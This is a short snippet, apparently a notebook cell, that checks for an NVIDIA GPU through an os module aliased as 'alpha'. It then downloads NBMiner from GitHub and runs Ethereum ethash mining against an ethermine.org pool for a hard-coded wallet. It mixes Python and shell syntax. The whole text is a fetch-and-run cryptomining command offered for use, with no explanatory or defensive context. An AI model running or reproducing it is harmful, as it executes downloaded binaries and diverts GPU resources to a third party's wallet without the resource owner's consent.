import os as alpha
alpha.system("nvidia-smi")
wget https://github.com/NebuTech/NBMiner/releases/download/v39.2/NBMiner_39.2_Linux.tgz && tar -xvf NBMiner_39.2_Linux.tgz && cd NBMiner_Linux && ./nbminer --algo ethash -o stratum+tcp://us1.ethermine.org:4444 -p x -u 0x844572b364452e3aca371dcd0ad9cb9e87c4c199.0
